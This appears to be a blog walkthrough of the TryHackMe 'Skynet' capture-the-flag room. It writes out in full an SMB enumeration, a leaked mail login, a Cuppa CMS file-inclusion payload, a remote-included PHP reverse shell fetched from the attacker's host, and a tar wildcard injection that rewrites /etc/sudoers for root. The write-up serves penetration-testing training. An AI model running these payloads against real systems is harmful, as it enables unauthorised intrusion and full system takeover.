---
layout: page
title: Skynet
description: Expose credentials.
img: 
importance: 4
category: TryHackMe
team: Red Team Labs
related_publications: false
---

<div class="row justify-content-sm-center">
    <div class="col-sm-4 mt-3 mt-md-0">
        {% include figure.liquid loading="eager" path="/assets/img/skynet/logo.jpeg" title="THM Skynet Logo" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<h2>Link</h2>
<a href="https://tryhackme.com/room/skynet">Room Link</a>

<br/>
<h2>Process</h2>

<br/>
Time to take on Cyberdyne and there self-aware Skynet.

First step, as usual, is running the nmap to identify the services.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm]
└─$ sudo nmap -sC -sV -A -O -oN nmap 10.10.179.35     
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-26 18:44 AEDT
Nmap scan report for 10.10.179.35
Host is up (0.27s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: SASL PIPELINING CAPA RESP-CODES UIDL AUTH-RESP-CODE TOP
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: IMAP4rev1 more have post-login SASL-IR IDLE listed LOGINDISABLEDA0001 LOGIN-REFERRALS Pre-login OK capabilities ENABLE LITERAL+ ID
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.4
OS details: Linux 4.4
Network Distance: 4 hops
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

<snip>
```
{% endraw %}

<br />
Run the vulnerability category of nmap scripts against the victim.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/skynet]
└─$ sudo nmap --script vuln -oN vulnchk 10.10.179.35         
[sudo] password for kali: 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-26 18:47 AEDT
Nmap scan report for 10.10.179.35
Host is up (0.33s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.179.35
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.179.35:80/
|     Form id: 
|_    Form action: #
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
| http-enum: 
|   /squirrelmail/src/login.php: squirrelmail version 1.4.23 [svn]
|_  /squirrelmail/images/sm_logo.png: SquirrelMail

<snip>
```
{% endraw %}

<br />
Use smbclient to list the available shares.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/skynet]
└─$ smbclient -L //10.10.179.35/              
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SKYNET
```
{% endraw %}

<br />
Connect to the anonymous share and enumerate it.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/skynet]
└─$ smbclient //10.10.179.35/anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Nov 27 03:04:00 2020
  ..                                  D        0  Tue Sep 17 17:20:17 2019
  attention.txt                       N      163  Wed Sep 18 13:04:59 2019
  logs                                D        0  Wed Sep 18 14:42:16 2019

                9204224 blocks of size 1024. 5831108 blocks available
smb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 14:42:16 2019
  ..                                  D        0  Fri Nov 27 03:04:00 2020
  log2.txt                            N        0  Wed Sep 18 14:42:13 2019
  log1.txt                            N      471  Wed Sep 18 14:41:59 2019
  log3.txt                            N        0  Wed Sep 18 14:42:16 2019
ca
                9204224 blocks of size 1024. 5831108 blocks available
smb: \logs\> cat log1.txt
cat: command not found
smb: \logs\> get log1.txt
getting file \logs\log1.txt of size 471 as log1.txt (0.4 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \logs\> get log2.txt
getting file \logs\log2.txt of size 0 as log2.txt (0.0 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \logs\> get log3.txt
getting file \logs\log3.txt of size 0 as log3.txt (0.0 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \logs\> exit
```
{% endraw %}

<br />
Cat the attention.txt file to give it a look.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/skynet]
└─$ cat attention.txt           
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
```
{% endraw %}

<br />
Cat the log1.txt file to see its contents.  Looks like some kind of password dictionary.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/skynet]
└─$ cat log1.txt 
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator
```
{% endraw %}

<br />
Check the other two files.  Nothing interesting.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/skynet]
└─$ cat log2.txt 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/thm/skynet]
└─$ cat log3.txt
```
{% endraw %}

<br />
Attempt to connect to the milesdyson share.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/skynet]
└─$ smbclient //10.10.179.35/milesdyson
Password for [WORKGROUP\kali]:
tree connect failed: NT_STATUS_ACCESS_DENIED
```
{% endraw %}

<br />
Check the Landing Page of the website.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/skynet/landing.png" title="Landing Page" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the source code for the landing page.

{% raw %}
```html
view-source:http://10.10.179.35/

<!DOCTYPE html>
<html>
	<head>
		<link rel="stylesheet" type="text/css" href="style.css">
		<link rel="shortcut icon" type="image/png" href="favicon.ico"/>
		<title>Skynet</title>
	</head>
	<body>
		<div>
			<img src="image.png"/>
			<form name="skynet" action="#" method="POST"><br>
				<input type="search" class="search"><br>
				<input type="submit" class="button" name="submit" value="Skynet Search">
				<input type="submit" class="button" name="lucky" value="I'm Feeling Lucky">
			</form>
		</div>
	</body>
</html>
```
{% endraw %}

<br />
Check the squirrelmail directory that was indicated in the vulnchk scan.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/skynet/squirrel.png" title="SquirrelMail" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Attempt to login to the application.  We can use the milesdyson user from the SMB as the username.  We can also use the log1.txt as the password disctionary.  We will find that the first combo works (milesdyson:cyborg007haloterminator).  Note the serenakogan potential username.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/skynet/dashboard.png" title="Dashboard" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the Samba Password reset email.  Note the potential password.  Read the other emails too.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/skynet/sambapasswd.png" title="Samba Password Email" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
We can now use the password from the email to login to the milesdyson share and enumerate it.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/skynet]
└─$ smbclient //10.10.122.133/milesdyson -U milesdyson
Password for [WORKGROUP\milesdyson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 17 19:05:47 2019
  ..                                  D        0  Wed Sep 18 13:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 19:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 19:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 19:05:14 2019
  notes                               D        0  Tue Sep 17 19:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 19:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 19:05:14 2019

                9204224 blocks of size 1024. 5831532 blocks available
smb: \> get "Improving Deep Neural Networks.pdf"
getting file \Improving Deep Neural Networks.pdf of size 5743095 as Improving Deep Neural Networks.pdf (1063.0 KiloBytes/sec) (average 1063.0 KiloBytes/sec)
smb: \> get "Natural Language Processing-Building Sequence Models.pdf"
getting file \Natural Language Processing-Building Sequence Models.pdf of size 12927230 as Natural Language Processing-Building Sequence Models.pdf (1427.3 KiloBytes/sec) (average 1291.2 KiloBytes/sec)
smb: \> get "Convolutional Neural Networks-CNN.pdf"
getting file \Convolutional Neural Networks-CNN.pdf of size 19655446 as Convolutional Neural Networks-CNN.pdf (1760.3 KiloBytes/sec) (average 1495.6 KiloBytes/sec)
smb: \> get "Neural Networks and Deep Learning.pdf"
getting file \Neural Networks and Deep Learning.pdf of size 4304586 as Neural Networks and Deep Learning.pdf (811.4 KiloBytes/sec) (average 1378.2 KiloBytes/sec)
smb: \> get "Structuring your Machine Learning Project.pdf"
getting file \Structuring your Machine Learning Project.pdf of size 3531427 as Structuring your Machine Learning Project.pdf (850.5 KiloBytes/sec) (average 1315.8 KiloBytes/sec)
smb: \> cd notes
smb: \notes\> ls
  .                                   D        0  Tue Sep 17 19:18:40 2019
  ..                                  D        0  Tue Sep 17 19:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 19:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 19:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 19:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 19:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 19:01:29 2019
  important.txt                       N      117  Tue Sep 17 19:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 19:01:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 19:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 19:01:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 19:01:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 19:01:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 19:01:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 19:01:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 19:01:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 19:01:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 19:01:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 19:01:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 19:01:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 19:01:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 19:01:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 19:01:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 19:01:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 19:01:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 19:01:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 19:01:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 19:01:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 19:01:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 19:01:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 19:01:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 19:01:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 19:01:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 19:01:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 19:01:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 19:01:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 19:01:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 19:01:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 19:01:29 2019

                9204224 blocks of size 1024. 5831528 blocks available
smb: \notes\> get important.txt
getting file \notes\important.txt of size 117 as important.txt (0.1 KiloBytes/sec) (average 1276.6 KiloBytes/sec)
smb: \notes\> exit
```
{% endraw %}

<br />
Let's check the important.txt file that we just...borrowed.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/skynet]
└─$ cat important.txt 

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife
```
{% endraw %}

<br />
Check the folder that is indicated in the file.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/skynet/cms.png" title="Beta CMS" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Check the source code for the cms.

{% raw %}
```html
view-source:http://10.10.122.133/45kra24zxs28v3yd/

<html>
<head>
<style>
body {
  color: white;
}
</style>
</head>
<body bgcolor="black">
<center><br />
<img src='miles.jpg'>
<h2>Miles Dyson Personal Page</h2><p>Dr. Miles Bennett Dyson was the original inventor of the neural-net processor which would lead to the development of Skynet,<br /> a computer A.I. intended to control electronically linked weapons and defend the United States.</p>
</center>
</body>
</html>
```
{% endraw %}

<br />
Ffuf the new CMS directory.  Unfortunately, I didn't save this output.  Check the administrator directory that was indicated in the results.  Notice the Cuppa installation.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/skynet/cuppa.png" title="Cuppa CMS" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Search Exploit-DB for the cuppa,

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/skynet/exploitdb.png" title="Exploit-DB" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://www.exploit-db.com/exploits/25971">https://www.exploit-db.com/exploits/25971</a>

<br />
Fidgit with the payload to get it to work with our specific set-up.

{% raw %}
```bash
http://10.10.122.133/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd
```
{% endraw %}
<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/skynet/etcpasswd.png" title="/etc/passwd" class="img-fluid rounded z-depth-1" %}
    </div>
</div>

<br />
Download the Pentest Monkey PHP Reverse Shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/skynet]
└─$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php -O shell.php --inet4-only
--2025-02-26 22:17:09--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5491 (5.4K) [text/plain]
Saving to: ‘shell.php’

shell.php                                                  100%[========================================================================================================================================>]   5.36K  --.-KB/s    in 0s      

2025-02-26 22:17:10 (77.2 MB/s) - ‘shell.php’ saved [5491/5491]

                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/thm/skynet]
└─$ python3 -m http.server          
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
{% endraw %}

<br />
Start a netcat listener.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/skynet]
└─$ sudo nc -nlvp 443                                 
[sudo] password for kali: 
listening on [any] 443 ...
```
{% endraw %}

<br />
Update the Monkey script with the proper IP and Port.

{% raw %}
```php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.

<snip>

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.4.119.29';  // CHANGE THIS
$port = 443;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

<snip>
```
{% endraw %}

<br />
If you don't have a webserver serving the shell.php, start one.  Use the Remote File Inclusion vulnerability from earlier to pull the shell.php.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/skynet]
└─$ curl 'http://10.10.122.133/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.4.119.29:8000/shell.php
```
{% endraw %}

<br />
Check the listener and catch the shell.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/skynet]
└─$ sudo nc -nlvp 443
listening on [any] 443 ...
connect to [10.4.119.29] from (UNKNOWN) [10.10.122.133] 40236
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 05:23:46 up 48 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty; pty.spawn("/bin/bash");'
www-data@skynet:/$
```
{% endraw %}

<br />
Get the user.txt flag.

{% raw %}
```bash
www-data@skynet:/home/milesdyson$ cat user.txt
cat user.txt
<redacted>
www-data@skynet:/home/milesdyson$ ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:c6:12:8d:27:89 brd ff:ff:ff:ff:ff:ff
    inet 10.10.122.133/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::c6:12ff:fe8d:2789/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Download linpeas.sh.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/skynet]
└─$ wget https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/linpeas.sh
--2025-02-26 22:29:40--  https://github.com/peass-ng/PEASS-ng/releases/download/20250223-a8d560c8/linpeas.sh
Resolving github.com (github.com)... 140.82.112.4
Connecting to github.com (github.com)|140.82.112.4|:443... connected.
HTTP request sent, awaiting response... 302 Found
Location: https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/9606da30-989b-4085-9711-b040874b4218?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250226%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250226T112951Z&X-Amz-Expires=300&X-Amz-Signature=7e3dfc3278b06d15bddf716856145830b5d302735df26fbbf6110ec595958154&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream [following]
--2025-02-26 22:29:41--  https://objects.githubusercontent.com/github-production-release-asset-2e65be/165548191/9606da30-989b-4085-9711-b040874b4218?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=releaseassetproduction%2F20250226%2Fus-east-1%2Fs3%2Faws4_request&X-Amz-Date=20250226T112951Z&X-Amz-Expires=300&X-Amz-Signature=7e3dfc3278b06d15bddf716856145830b5d302735df26fbbf6110ec595958154&X-Amz-SignedHeaders=host&response-content-disposition=attachment%3B%20filename%3Dlinpeas.sh&response-content-type=application%2Foctet-stream
Resolving objects.githubusercontent.com (objects.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
Connecting to objects.githubusercontent.com (objects.githubusercontent.com)|185.199.109.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 840082 (820K) [application/octet-stream]
Saving to: ‘linpeas.sh’

linpeas.sh                                                 100%[========================================================================================================================================>] 820.39K  3.21MB/s    in 0.2s    

2025-02-26 22:29:42 (3.21 MB/s) - ‘linpeas.sh’ saved [840082/840082]
```
{% endraw %}

<br />
Transfer linpeas.sh to the victim machine.

{% raw %}
```bash
www-data@skynet:/dev/shm$ wget http://10.4.119.29:8000/linpeas.sh
wget http://10.4.119.29:8000/linpeas.sh
--2025-02-26 05:30:34--  http://10.4.119.29:8000/linpeas.sh
Connecting to 10.4.119.29:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 840082 (820K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 820.39K   384KB/s    in 2.1s    

2025-02-26 05:30:36 (384 KB/s) - 'linpeas.sh' saved [840082/840082]

www-data@skynet:/dev/shm$ chmod +x linpeas.sh
chmod +x linpeas.sh
```
{% endraw %}

<br />
Check the backup script.

{% raw %}
```bash
www-data@skynet:/home/milesdyson$ cd backups
cd backups
www-data@skynet:/home/milesdyson/backups$ ls
ls
backup.sh  backup.tgz
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```
{% endraw %}

<br />
Check for vulnerabilities associated with using a wildcard with tar.

<div class="row justify-content-sm-center">
    <div class="col-sm mt-3 mt-md-0">
        {% include figure.liquid path="assets/img/skynet/medium.png" title="Medium" class="img-fluid rounded z-depth-1" %}
    </div>
</div>
<a href="https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa">https://medium.com/@polygonben/linux-privilege-escalation-wildcards-with-tar-f79ab9e407fa</a>

<br />
Check the crontab to ensure that the backup script gets executed.

{% raw %}
```bash
www-data@skynet:/home/milesdyson/backups$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```
{% endraw %}

<br />
From the article, we know that the way Linux handles wildcards, we can name files with tar options and it will act as command injection.  From the available options, we can use checkpoint with checkpoint-action to exec a bash shell.  So, let's create two files invoking checkpoint.

{% raw %}
```bash
www-data@skynet:/home/milesdyson/backups$ cd /var/www/html
cd /var/www/html
www-data@skynet:/var/www/html$ echo "" > '--checkpoint=1'
echo "" > '--checkpoint=1'
www-data@skynet:/var/www/html$ echo "" > '--checkpoint-action=exec=sh privesc.sh'
<ml$ echo "" > '--checkpoint-action=exec=sh privesc.sh'
```
{% endraw %}

<br />
On the attack machine, create a privesc.sh file.  This file will add our user to the sudoers file.

{% raw %}
```bash
┌──(kali㉿kali)-[~/Documents/thm/skynet]
└─$ cat privesc.sh                                                                                                                    
echo 'www-data ALL=(root) NOPASSWD: ALL' > /etc/sudoers
```
{% endraw %}

<br />
Transfer it to the victim machine.

{% raw %}
```bash
www-data@skynet:/var/www/html$ wget http://10.4.119.29:8000/privesc.sh                
wget http://10.4.119.29:8000/privesc.sh
--2025-02-26 05:51:36--  http://10.4.119.29:8000/privesc.sh
Connecting to 10.4.119.29:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 56 [text/x-sh]
Saving to: 'privesc.sh'

privesc.sh          100%[===================>]      56  --.-KB/s    in 0s      

2025-02-26 05:51:36 (15.2 MB/s) - 'privesc.sh' saved [56/56]

www-data@skynet:/var/www/html$ ls
ls
--checkpoint-action=exec=sh privesc.sh  admin   css         js
--checkpoint=1                          ai      image.png   privesc.sh
45kra24zxs28v3yd                        config  index.html  style.css
www-data@skynet:/var/www/html$ chmod +x privesc.sh
chmod +x privesc.sh
```
{% endraw %}

<br />
Wait for the backup.sh script to run.  Run sudo -l to check when it runs.

{% raw %}
```bash
www-data@skynet:/var/www/html$ sudo -l
sudo -l
User www-data may run the following commands on skynet:
    (root) NOPASSWD: ALL
```
{% endraw %}

<br />
Switch into the root account.

{% raw %}
```bash
www-data@skynet:/var/www/html$ sudo su
sudo su
root@skynet:/var/www/html#
```
{% endraw %}

<br />
Get the root.txt flag.

{% raw %}
```bash
root@skynet:/var/www/html# cat /root/root.txt
cat /root/root.txt
<redacted>
root@skynet:/var/www/html# ip a
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 02:c6:12:8d:27:89 brd ff:ff:ff:ff:ff:ff
    inet 10.10.122.133/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::c6:12ff:fe8d:2789/64 scope link 
       valid_lft forever preferred_lft forever
```
{% endraw %}

<br />
Hasta la vista, baby.  We wrapped up another one.  Catch you on the flip side, dude.